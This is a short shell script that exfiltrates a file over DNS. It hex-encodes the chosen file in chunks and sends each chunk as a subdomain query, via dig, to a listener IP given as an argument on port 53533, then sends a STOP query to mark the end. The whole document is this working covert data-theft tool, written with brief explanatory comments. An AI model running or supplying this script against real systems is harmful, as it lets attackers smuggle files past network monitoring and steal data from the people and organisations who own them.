#!/bin/sh

# IP of the listener
ip=$1
# PAth to the file to send
file_path=$2

# Generate an id to allow the listener to listen to multiple files.
id=$(date +%s)

# Dig counter to specify the count number in the dns
count=1

# Read a file in hexadecimal by chunk of 31 characters
xxd -ps -c 31 "$file_path" | while read hex; do
  # For each file, use dig to send a dns request to the dns server
  domain="$hex.$count.$id"
  dig @"$ip" -p 53533 "$domain" +retry=1 +timeout=1 > /dev/null
  # Increment counter for next call
  count=$((count + 1))
done

# Send a last request to tell the listener that the whole file was sent
dig @"$ip" -p 53533 "STOP.0.$id" > /dev/null

echo "File sent"

